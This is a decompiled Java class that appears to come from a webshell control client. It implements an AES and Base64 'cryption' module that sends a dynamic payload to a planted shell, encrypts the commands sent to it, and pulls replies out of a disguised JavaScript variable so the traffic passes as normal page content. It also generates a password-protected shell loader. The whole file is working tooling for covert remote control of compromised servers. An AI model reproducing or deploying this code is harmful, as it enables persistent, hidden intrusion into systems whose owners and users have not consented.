/*
 * Decompiled with CFR 0.153-SNAPSHOT (d6f6758-dirty).
 */
package shells.cryptions.JavaAes_null;

import core.annotation.CryptionAnnotation;
import core.imp.Cryption;
import core.shell.ShellEntity;
import java.net.URLEncoder;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import shells.cryptions.JavaAes_null.Generate;
import shells.cryptions.JavaRSA.JavaRSA;
import util.Log;
import util.functions;
import util.http.Http;

@CryptionAnnotation(Name="JAVA_AES_null_BASE64", payloadName="JavaDynamicPayload")
public class JavaAes_nullBase64
implements Cryption {
    private ShellEntity shell;
    private Http http;
    private Cipher decodeCipher;
    private Cipher encodeCipher;
    private String key;
    private boolean state;
    private byte[] payload;
    private String findStrLeft;
    private String pass;
    private String findStrRight;
    private String findStrLeft1;

    @Override
    public void init(ShellEntity context) {
        this.shell = context;
        this.http = this.shell.getHttp();
        this.key = this.shell.getSecretKeyX();
        this.pass = this.shell.getPassword();
        String findStrMd5 = functions.md5(this.pass + new String(this.key));
        String md5Prefix = findStrMd5.substring(0, 5);
        this.findStrLeft1 = "var Rebdsek_config=";
        this.findStrLeft = this.findStrLeft1.replace("bdsek", md5Prefix);
        this.findStrRight = ";";
        try {
            this.encodeCipher = Cipher.getInstance("AES");
            this.decodeCipher = Cipher.getInstance("AES");
            this.encodeCipher.init(1, new SecretKeySpec(this.key.getBytes(), "AES"));
            this.decodeCipher.init(2, new SecretKeySpec(this.key.getBytes(), "AES"));
            this.payload = this.shell.getPayloadModule().getPayload();
            if (this.payload != null) {
                this.http.sendHttpResponse(this.payload);
                this.state = true;
            } else {
                Log.error("payload Is Null");
            }
        } catch (Exception e) {
            Log.error(e);
            return;
        }
    }

    @Override
    public byte[] encode(byte[] data) {
        try {
            byte[] final_byte = data;
            final_byte = this.encodeCipher.doFinal(final_byte);
            final_byte = JavaRSA.base64Encode(final_byte);
            return (this.pass + "=" + URLEncoder.encode(functions.base64EncodeToString(final_byte))).getBytes();
        } catch (Exception e) {
            Log.error(e);
            return null;
        }
    }

    @Override
    public byte[] decode(byte[] data) {
        try {
            data = functions.base64Decode(this.findStr(data));
            return this.decodeCipher.doFinal(data);
        } catch (Exception e) {
            Log.error(e);
            return null;
        }
    }

    public String findStr(byte[] respResult) {
        String htmlString = new String(respResult);
        return functions.subMiddleStr(htmlString, this.findStrLeft, this.findStrRight);
    }

    @Override
    public boolean isSendRLData() {
        return true;
    }

    @Override
    public boolean check() {
        return this.state;
    }

    @Override
    public byte[] generate(String password, String secretKey) {
        return Generate.GenerateShellLoder(password, functions.md5(secretKey).substring(0, 16), false);
    }
}

